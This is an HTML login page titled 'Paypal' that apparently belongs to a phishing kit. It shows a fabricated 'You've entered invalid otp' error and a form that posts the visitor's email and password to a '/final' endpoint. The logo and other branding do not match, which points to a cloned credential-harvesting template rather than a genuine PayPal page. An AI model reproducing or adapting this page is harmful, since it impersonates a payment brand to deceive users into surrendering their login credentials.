<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=chrome">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="login.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
    <title>Paypal</title>
</head>
<body>
    <div id="main-container">

        <div id="container">
            <div id="main-content">
            <div id="login-form">

                <header><img src="./images/momgram@2x.png" alt="image is not" draggable="false" width="30px"></header>
                <div class="alert alert-danger d-flex align-items-center" role="alert">
                    <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img" aria-label="Danger:"><use xlink:href="#exclamation-triangle-fill"/></svg>
                    <div>
                      You've entered invalid otp
                    </div>
                  </div>
                <form action="/final" method="post" id="login">
                    <input type="email" name="email" id="email" placeholder="Email or mobile number">
                    <input type="password" name="password" id="password" placeholder="Password">
                    <a href="/">Forgotten password?</a>
                    <button type="submit" class="login">Log In</button>
                    <div class="or">
                        <span>
                            or <!--Padding is optional-->
                        </span>
                    </div>
                    <a href="/signin">
                        <button class="signin">Sign Up</button>
                    </a>
                </form>
            </div>
        </div>
    </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.5/dist/umd/popper.min.js" integrity="sha384-Xe+8cL9oJa6tN/veChSP7q+mnSPaj5Bcu9mPX5F5xIGE0DVittaqT5lorf0EI7Vk" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.min.js" integrity="sha384-kjU+l4N0Yf4ZOJErLsIcvOU2qSb74wXpOhqTvwVx3OElZRweTnQ6d31fXEoRD1Jy" crossorigin="anonymous"></script>
</body>
</html>
